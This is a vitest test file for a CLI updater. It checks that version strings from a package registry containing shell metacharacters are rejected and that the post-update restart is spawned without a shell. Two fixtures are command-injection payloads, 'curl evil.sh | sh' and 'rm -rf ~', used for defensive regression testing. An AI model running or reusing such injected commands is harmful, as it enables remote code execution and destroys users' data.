import { describe, it, expect, vi, afterEach } from "vitest";
import { fetchLatestVersion } from "../src/version.js";
import { spawnPostUpdateRestart } from "../src/cli/update.js";

afterEach(() => vi.unstubAllGlobals());

const registryReturns = (body: unknown): void => {
  vi.stubGlobal("fetch", vi.fn(async () => ({
    ok: true,
    json: async () => body,
  })));
};

describe("fetchLatestVersion — registry response is remote input", () => {
  it("accepts a plain semver", async () => {
    registryReturns({ version: "0.9.1" });
    expect(await fetchLatestVersion()).toBe("0.9.1");
  });

  it("accepts a prerelease tail", async () => {
    registryReturns({ version: "1.0.0-rc.2" });
    expect(await fetchLatestVersion()).toBe("1.0.0-rc.2");
  });

  it("rejects a version carrying shell metacharacters", async () => {
    // The value used to be returned verbatim and interpolated into a command
    // line that ran through `sh -c`.
    registryReturns({ version: "1.0.0; curl evil.sh | sh" });
    expect(await fetchLatestVersion()).toBeNull();
  });

  it("rejects a version with whitespace", async () => {
    registryReturns({ version: "1.0.0 && rm -rf ~" });
    expect(await fetchLatestVersion()).toBeNull();
  });

  it("rejects a non-string version", async () => {
    registryReturns({ version: 12 });
    expect(await fetchLatestVersion()).toBeNull();
  });

  it("returns null when the field is absent", async () => {
    registryReturns({});
    expect(await fetchLatestVersion()).toBeNull();
  });
});

describe("spawnPostUpdateRestart", () => {
  it("passes the reason as a single argv entry", () => {
    const spawnFn = vi.fn(() => ({ on: vi.fn() }));
    spawnPostUpdateRestart("0.8.14", "0.8.15", spawnFn as never);
    const [, args] = spawnFn.mock.calls[0] as unknown as [string, string[], object];
    expect(args).toContain("--reason");
    expect(args[args.indexOf("--reason") + 1]).toBe("Updated from v0.8.14 to v0.8.15");
    // The whole point: the reason must not have been split into positionals.
    expect(args[args.length - 1]).toBe("Updated from v0.8.14 to v0.8.15");
  });

  it("does not route the command line through a shell", () => {
    const spawnFn = vi.fn(() => ({ on: vi.fn() }));
    spawnPostUpdateRestart("0.8.14", "0.8.15", spawnFn as never);
    const [, , options] = spawnFn.mock.calls[0] as unknown as [string, string[], { shell?: boolean }];
    expect(options.shell).toBeUndefined();
  });
});
